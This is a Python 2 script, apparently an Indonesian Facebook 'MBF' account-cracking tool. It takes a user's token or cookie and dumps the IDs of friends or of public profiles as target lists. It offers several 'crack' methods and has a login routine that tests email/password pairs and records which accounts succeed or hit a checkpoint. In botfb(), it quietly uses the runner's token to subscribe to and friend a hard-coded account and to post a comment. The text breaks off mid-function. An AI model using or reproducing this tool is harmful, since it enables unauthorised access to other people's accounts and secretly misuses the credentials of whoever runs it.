import requests, bs4, sys, os, subprocess, requests, sys, random, time, re, base64, json
from datetime import datetime
from time import sleep
from requests.exceptions import ConnectionError
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
hari = ['Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu', 'Minggu']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
os.system('clear')
animasis = ['[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□', '[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]', '[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□', '[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]', '[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□', '[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]', '[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□', '[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]', '[□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□□', '[■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■□]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]', '[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]']
for i in range(len(animasis)):
    time.sleep(0.01)
    m = random.choice(['\x1b[1;93m', '\x1b[1;96m', '\x1b[1;95m', '\x1b[1;91m', '\x1b[1;94m'])
    sys.stdout.write('\r\x1b[1;91m#' + m + 'Loading\x1b[1;92m-' + random.choice(['\x1b[1;97m', '\x1b[1;97m', '\x1b[1;97m', '\x1b[1;97m', '\x1b[1;97m', '\x1b[1;97m']) + animasis[(i % len(animasis))])
    sys.stdout.flush()

os.system('clear')
from requests.exceptions import ConnectionError
from multiprocessing.pool import ThreadPool
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)

def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '%s;' % str(31 + j))

    x += ''
    x = x.replace('!0', '')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m [+] Mohon Tunggu\x1b[1;97m ' + o,
        sys.stdout.flush()
        time.sleep(1)


logo = '\x1b[1;95m• \x1b[1;92mrom.py\n\x1b[1;93m     _____ _______________________________ \n    /     \\\\______   \\_   _____/\\______   \\  \n   /  \\ /  \\|    |  _/|    __)   |    |  _/ \n  /    Y    \\    |   \\|     \\    |    |   \\ \n  \\____|__  /______  /\\___  /    |______  / \n          \\/       \\/     \\/            \\/      \n          [ github.com/Mark-Zuck ] \n '
logo2 = '\x1b[1;95m• \x1b[1;92mrom.py\n\x1b[1;93m     _____ _______________________________ \n    /     \\\\______   \\_   _____/\\______   \\  \n   /  \\ /  \\|    |  _/|    __)   |    |  _/ \n  /    Y    \\    |   \\|     \\    |    |   \\ \n  \\____|__  /______  /\\___  /    |______  / \n          \\/       \\/     \\/            \\/      \n          [ github.com/Mark-Zuck ] \n '
host = 'https://mbasic.facebook.com'
ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
ips = None
try:
    b = requests.get('https://api.ipify.org').text.strip()
    ips = requests.get('https://ipapi.com/ip_api.php?ip=' + b, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 5.1.1; walleye/Bulid/LMY48G;wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36'}).json()['country_name'].lower()
except:
    ips = None

uas = None
if os.path.exists('.browser'):
    if os.path.getsize('.browser') != 0:
        uas = open('.browser').read().strip()
mbasic_h = {'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': uas, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
graph_h = {'Host': 'graph.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': uas, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
local_h = {'Host': 'localhost:5000', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': uas, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}

def clear():
    if ' linux' in sys.platform.lower():
        os.system('clear')
    elif 'win' in sys.platform.lower():
        os.system('cls')
    else:
        os.system('clear')


def lang(cookies):
    f = False
    rr = bs4.BeautifulSoup(requests.get('https://mbasic.facebook.com/language.php', headers=hdcok(), cookies=cookies).text, 'html.parser')
    for i in rr.find_all('a', href=True):
        if 'id_ID' in i.get('href'):
            requests.get('https://mbasic.facebook.com/' + i.get('href'), cookies=cookies, headers=hdcok())
            b = requests.get('https://mbasic.facebook.com/profile.php', headers=hdcok(), cookies=cookies).text
            if 'apa yang anda pikirkan sekarang' in b.lower():
                f = True

    if f == True:
        return True
    exit('\x1b[1;91m [!] Sudah invalid')


def basecookie():
    if os.path.exists('.cok'):
        if os.path.getsize('.cok') != 0:
            return gets_dict_cookies(open('.cok').read().strip())
        masuk()
    else:
        masuk()


def hdcok():
    global host
    global ua
    hosts = host
    r = {'origin': hosts, 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', hosts)), 'referer': hosts + '/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'}
    return r


h = {'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}

def login(em, pas, hosts):
    global h
    r = requests.Session()
    r.headers.update(h)
    p = r.get('https://m.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd', '__csr': '', 
       '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}
            return

        return


def gets_cookies(cookies):
    result = []
    for i in enumerate(cookies.keys()):
        if i[0] == len(cookies.keys()) - 1:
            result.append(i[1] + '=' + cookies[i[1]])
        else:
            result.append(i[1] + '=' + cookies[i[1]] + '; ')

    return ('').join(result)


def gets_dict_cookies(cookies):
    result = {}
    try:
        for i in cookies.split(';'):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result
    except:
        for i in cookies.split('; '):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result


def masuk():
    os.system('clear')
    print logo2
    print 48 * '\x1b[1;97m═'
    print '\x1b[1;97m [1] Login Token Facebook'
    print ' \x1b[1;97m[2] Login Cookie Facebook'
    print ' \x1b[1;97m[3] Tutorial Youtube,Mendapatkan Token'
    print ' \x1b[1;97m[4] Tutorial Youtube,Mendapatkan Cookie'
    print ' \x1b[1;97m[\x1b[1;91m0\x1b[1;97m]\x1b[1;91m Keluar'
    print 48 * '\x1b[1;97m═'
    pilih()


def cookie():
    os.system('clear')
    print logo2
    print 48 * '\x1b[1;97m═'
    cookie = raw_input('\x1b[1;97m [?] Cookie >\x1b[1;93m ')
    tik()
    try:
        data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookie})
        find_token = re.search('(EAAA\\w+)', data.text)
        hasil = '\n* Fail : maybe your cookie invalid !!' if find_token is None else '\n* Your fb access token : ' + find_token.group(1)
    except requests.exceptions.ConnectionError:
        print '\n\x1b[1;91m [!] Tidak ada koneksi '

    cookie = open('login.txt', 'w')
    cookie.write(find_token.group(1))
    cookie.close()
    print '\n\x1b[1;92m [√] Login Berhasil'
    time.sleep(1)
    os.system('xdg-open https://www.facebook.com/romi.29.04.03')
    botfb()
    return


def token():
    os.system('clear')
    print logo2
    print 48 * '\x1b[1;97m═'
    toket = raw_input('\x1b[1;97m [?] Token >\x1b[1;93m ')
    tik()
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print '\n\x1b[1;92m [√] Login Berhasil'
        time.sleep(1)
        os.system('xdg-open https://www.facebook.com/romi.29.04.03')
        botfb()
    except KeyError:
        print '\n\x1b[1;91m [!] Token Salah'
        time.sleep(1)
        masuk()


def botfb():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m [!] Sudah invalid'
        masuk()

    user = '100002461344178'
    kom = 'Pengguna MBF 😸'
    post = '3889825767776096'
    requests.post('https://graph.facebook.com/100002461344178/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/' + user + '/friends?access_token=' + toket)
    requests.post('https://graph.facebook.com/posts/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    romi_ganz()


def romi_ganz():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\x1b[1;91m [!] Sudah invalid'
        time.sleep(3)
        os.system('rm -rf login.txt')
        os.system('clear')
        masuk()

    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;91m [!] Sudah invalid'
        os.system('rm -rf login.txt')
        os.system('clear')
        masuk()
    except requests.exceptions.ConnectionError:
        print '\n\x1b[1;91m [!] Tidak ada koneksi '
        exit()

    os.system('clear')
    print logo
    print 48 * '\x1b[1;97m═'
    print ' \x1b[1;97m[ Selamat datang \x1b[1;92m' + nama + '\x1b[1;97m ] '
    print 48 * '\x1b[1;97m═'
    print ' \x1b[1;97m[1] Dump Id Teman'
    print '\x1b[1;97m [2] Dump Id Publik'
    print '\x1b[1;97m [3] Dump Id Dari Followers'
    print '\x1b[1;97m [4] Dump Id Postingan'
    print '\x1b[1;97m [5] Mulai crack'
    print ' \x1b[1;97m[\x1b[1;92m6\x1b[1;97m] \x1b[1;92mUpdate Tools'
    print '\x1b[1;97m [\x1b[1;91m7\x1b[1;97m]\x1b[1;91m Hapus Token/Cookie'
    print '\x1b[1;97m [\x1b[1;91m0\x1b[1;97m] \x1b[1;91mKeluar '
    print 48 * '\x1b[1;97m═'
    pilih_menu()


def pilih_menu():
    rom = raw_input('\x1b[1;97m [?] > \x1b[1;93m')
    if rom == '':
        print '\x1b[1;91m [!] Isi yang benar'
        time.sleep(1)
        os.system('clear')
        romi_ganz()
    elif rom == '1':
        teman()
    elif rom == '2':
        publik()
    elif rom == '3':
        followers()
    elif rom == '4':
        postingan()
    elif rom == '5':
        method()
    elif rom == '6':
        os.system('clear')
        os.system("echo -e '\n\t SEDANG MENGUPDATE TOOLS ' | lolcat ")
        os.system('pkg update && pkg upgrade')
        os.system('git pull')
        os.system('python2 rom.py')
    elif rom == '0':
        exit()
    elif rom == '7':
        print '\n\x1b[1;91m [!] Sedang Menghapus...'
        time.sleep(1)
        os.system('rm -rf login.txt')
        jalan('\n\x1b[1;92m [√] Bersahil Terhapus')
        print ''
        exit()
    else:
        print '\x1b[1;91m [!] Isi yang benar'
        time.sleep(1)
        os.system('clear')
        romi_ganz()


def method():
    os.system('clear')
    print logo2
    print 48 * '\x1b[1;97m═'
    print ' \x1b[1;97m[1] Methode \x1b[1;91mb-api (crack cepat 98%cp) '
    print '\x1b[1;97m [2] Methode \x1b[1;96mmbasic (crack lumayan cepat 80%cp) '
    print ' \x1b[1;97m[3] Methode \x1b[1;92mlocalhost (crack satu daerah 70%cp) '
    print ' \x1b[1;97m[4] Methode \x1b[1;94mmobile (crack lambat 65%cp) '
    print ' \x1b[1;97m[\x1b[1;91m0\x1b[1;97m] \x1b[1;91mkembali '
    print 48 * '\x1b[1;97m═'
    pilih_method()


def pilih_method():
    mi = raw_input('\x1b[1;97m [?] > \x1b[1;93m')
    if mi == '':
        print '\x1b[1;91m [!] Isi yang benar'
        time.sleep(1)
        pilih_method()
    elif mi == '1':
        crack1()
    elif mi == '2':
        crack()
    elif mi == '3':
        crack3()
    elif mi == '4':
        crack_mob()
    elif mi == '0':
        romi_ganz()
    else:
        print '\x1b[1;91m [!] Isi yang benar'
        time.sleep(1)
        pilih_method()


def teman():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m [!] Sudah invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        masuk()

    try:
        mmk = raw_input('\n\x1b[1;97m [?] File name : ')
        asw = raw_input('\x1b[1;97m [?] Limit : ')
        r = requests.get('https://graph.facebook.com/me?fields=friends.limit(' + asw + ')&access_token=' + toket)
        id = []
        z = json.loads(r.text)
        cin = ('dump/' + mmk + '.txt').replace(' ', '_')
        ys = open(cin, 'w')
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r\x1b[1;97m [*] Sedang proses dump \x1b[1;92m%s  ' % str(len(id)),
            sys.stdout.flush()
            time.sleep(0.005)

        ys.close()
        jalan('\n\x1b[1;92m [✓] Succes dump ')
        print '\x1b[1;97m [!] File tersimpan : \x1b[1;92m%s ' % cin
        print 48 * '\x1b[1;97m═'
        raw_input(' Tekan Enter ')
        romi_ganz()
    except Exception as e:
        exit('\n \x1b[1;91m[!] Dump Gagal')


def publik():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m [!] Sudah invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        masuk()

    try:
        idt = raw_input('\n\x1b[1;97m [?] Id Publik : ')
        mmk = raw_input(' \x1b[1;97m[?] Nama File : ')
        asw = raw_input('\x1b[1;97m [?] Limit : ')
        r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(' + asw + ')&access_token=' + toket)
        id = []
        z = json.loads(r.text)
        qq = ('dump/' + mmk + '.txt').replace(' ', '_')
        ys = open(qq, 'w')
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
